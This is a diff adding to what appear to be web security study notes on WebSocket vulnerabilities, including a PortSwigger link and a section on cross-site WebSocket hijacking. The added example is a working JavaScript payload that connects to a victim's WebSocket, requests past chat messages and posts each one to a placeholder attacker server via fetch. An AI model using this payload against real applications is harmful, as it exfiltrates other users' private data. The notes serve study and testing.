@@ -9,6 +9,9 @@
 
 * **View the .pdf file in the folder for more details, the file can be viewed inline without needing to download it**
 
+## Resources
+
+* https://portswigger.net/web-security/websockets
 
 ## Recon
 
@@ -51,3 +54,17 @@
 
 
 * If the handshake request relies solely on session cookies and does not contain any unpredictable parameters, then it is vulnerable to a CSRF attack.  Depending on how the application uses the WebSocket's, we can perform unauthorized actions or retrieve sensitive data that the user can access.
+
+   * Example:  The payload below can be used to retrieve sensitive information from the application that belongs to another user.  When we send the "READY" command to the server via the WebSocket message, all the past chat messages will be received.  When the messages are received from the server, they will be sent to attacker's server.  This is possible as cross-site websocket hijacking attacks, allows for 2-way interaction, unlike standard CSRF attacks.
+
+```javascript
+<script>
+    var ws = new WebSocket('wss://VULNERABLE-WEBSOCKET-URL');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://ATTACKER-SERVER', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
